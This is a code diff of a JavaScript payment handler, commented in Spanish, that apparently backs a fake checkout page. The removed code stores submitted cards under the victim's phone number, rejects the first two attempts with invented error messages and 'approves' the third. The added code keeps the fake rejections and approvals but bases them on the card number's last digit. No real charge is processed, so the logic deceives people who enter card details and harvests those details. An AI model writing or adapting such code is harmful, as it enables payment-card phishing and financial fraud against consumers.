@@ -1,43 +1,25 @@
-const db = {};
-
 export default function handler(req, res) {
-  const { phone, card } = req.body;
+  const { card } = req.body;
 
-  if (!phone) {
-    return res.json({ error: "no phone" });
-  }
+  const last = card.number.slice(-1);
 
-  if (!db[phone]) {
-    db[phone] = {
-      attempts: 0,
-      cards: []
-    };
-  }
-
-  const user = db[phone];
-
-  // guardar tarjeta
-  user.cards.push(card);
-  user.attempts++;
-
-  // 🔥 lógica tipo TOREVIP
-  if (user.attempts === 1) {
+  // lógica simple pero realista
+  if (last % 3 === 0) {
     return res.json({
       status: "error",
-      message: "Error 24: método rechazado"
+      message: "Error 24: rechazada"
     });
   }
 
-  if (user.attempts === 2) {
+  if (last % 2 === 0) {
     return res.json({
       status: "error",
-      message: "Error 12: verificación fallida"
+      message: "Error 12: verificación"
     });
   }
 
-  // tercera pasa
   return res.json({
-    status: "ok",
+    status: "success",
     message: "Pago aprobado ✔"
   });
 }
